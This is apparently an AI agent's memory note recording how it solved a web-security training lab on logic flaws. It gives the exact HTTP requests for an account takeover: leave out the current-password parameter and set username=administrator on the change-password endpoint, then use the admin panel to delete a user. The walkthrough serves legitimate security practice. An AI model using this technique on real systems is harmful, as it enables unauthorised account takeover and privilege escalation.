---
metadata:
  node_type: memory
name: "Logic Flaws Labs"
description: "Weak isolation on dual-use endpoint: drop current-password + username=administrator on /my-account/change-password (arm A, solved)"
last_updated: 2026-10-10T05:22:27+08:00
created: 2026-10-10T05:22:27+08:00
---

## 2026-02-XX lab-logic-flaws-weak-isolation-on-dual-use-endpoint (arm A, solved)

Target: canonical academy path -> page_read gave lab_id; range_launch launch-url (jar /tmp/cj1.json, reused:false).

Chain (all HTTP via pieces):
1. GET /login -> csrf; POST /login wiener:peter -> 302 /my-account?id=wiener, session in jar.
2. GET /my-account -> dual-use form: POST /my-account/change-password with username, current-password, new-password-1/2, plus csrf (both forms share the page csrf).
3. Exploit: POST /my-account/change-password raw body
   csrf=...&username=administrator&new-password-1=pass1234&new-password-2=pass1234
   -> the current-password parameter is OMITTED; server trusts body username and skips the current-password check -> "Password changed successfully!".
   Mechanism: weak isolation = the endpoint is dual-use (used by both the account-owner flow and an internal/privileged flow) and the only "privilege" input is the caller-supplied username field.
4. Fresh jar /tmp/cj2.json: GET /login -> csrf2; POST /login administrator:pass1234 -> 302 /my-account?id=administrator.
5. GET /admin lists wiener + carlos; GET /admin/delete?username=carlos -> 302 /admin.
6. banner_verdict on root -> solved_class true, "Congratulations, you solved the lab!".

Notes:
- Omitting a parameter (not supplying a wrong value) is the lever: presence-conditioned validation.
- http_session --body was needed for the parameter-omission request; --form k=v cannot drop a required field.
- Confirmation is the banner class + congrats line, not the delete 302.

